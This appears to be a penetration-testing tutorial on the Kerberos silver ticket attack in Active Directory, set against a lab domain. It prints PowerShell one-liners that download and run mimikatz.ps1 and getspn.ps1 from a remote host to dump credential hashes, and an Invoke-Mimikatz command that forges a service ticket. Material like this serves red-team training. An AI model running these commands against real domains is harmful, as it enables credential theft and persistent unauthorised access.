# Silver Ticket

## Intro

Silver ticket attack is one of the ways to gain domain persistence. Once you have gained domain admin or you could dump hashes of a service account some how. If you have recalled how Kerberos works let’s see where this attack fits in the cycle.

On the last step of the process when the client sends a TGS to the service that is where we can send a forged TGS and get access directly to the service and get a service ticket using this method.

![](<../../../.gitbook/assets/image (191).png>)

#### Silver ticket abuses the part of Kerberos authentication where a client sends a Valid TGS to get a service ticket. So if an attacker knows the hash of the service account he can forge a fake service ticket with it. Kerberos will trust it since it can be decrypted by the service as its signed by the NTLM hash of the service.

{% hint style="info" %}
downside of this attack is at unlike golden ticket which gives us access to everything. A silver ticket will only allow us access to a particular service or all the services that are running with the same service account.

Another disadvantage of this attack is if the service account is a machine account or a user account. If the password of the account changes this attack will fail. Since we wont have the correct hash of the user/machine account usually it changes within 30 days for machines. We would generally target these services when it comes to performing a silver ticket attack. CIFS (file system), HOST ( can schedule tasks ), RPCSS Host (runs wmi), WSman/http (ps remoting) all of these use the machine account as there service account.
{% endhint %}

## Dumping Password Hash

If an attacker can gain admin rights to the computer (to gain debug access) or be able to run code as local System, the attacker can dump the AD computer account password hash from the system using Mimikatz (the NTLM password hash is used to encrypt RC4 Kerberos tickets)

#### run this with admin privileges to load mimikatz into memory and dump user hashes:

```
powershell -ep bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/mimikatz.ps1'); invoke-mimikatz -command 'sekurlsa::logonpasswords'"
```

![](<../../../.gitbook/assets/image (189).png>)

**Target** – This is the host, which can be copied from the SPN value.

```
powershell -ep bypass -c "iex(new-object system.net.webclient).downloadstring('http://192.168.56.1/getspn.ps1')"
```

![](<../../../.gitbook/assets/image (186).png>)

## Forging Silver Ticket

#### the syntax for mimikatz command is:

```
 Invoke-Mimikatz -Command 'kerberos::golden /domain:megabank.local /sid:S-1-5-21-4081310294-3909750490-1069944866-1156 /target:sql.megabank.local:60111 /service:sql /rc4:77a5ee35032ad22d515577e7bd8e56c7 /user:paul /ptt'
```

**/domain :** domain name

**/sid:** domain SID value

**/target:** target service SPN

**/service:** service name

**/user:** username to create ticket for

**/rc4:** NTLM hash, will use

**/id , /groups :** these are to specify user id and group but this is optional

/endin : specify ticket lifetime in minutes (default 10 years)

**/ptt :** stands for pass the ticket it will load the ticket in memory. If we want to extract ticket on disk we can use **/ticket** option instead.

#### Now if we run the command above we get silver ticket that is created and stored in our current session

#### Now if we try to access the file system on sql.megabank.local machine. We can do it because we already have the tickets to authenticate us.

## Host Exploitation with Silver Ticket

By issuing a klist command you can see that we now have the ticket for sql service.

![](<../../../.gitbook/assets/image (190).png>)

more attack scenarios with silver tickets

{% embed url="https://adsecurity.org/?p=2011" %}
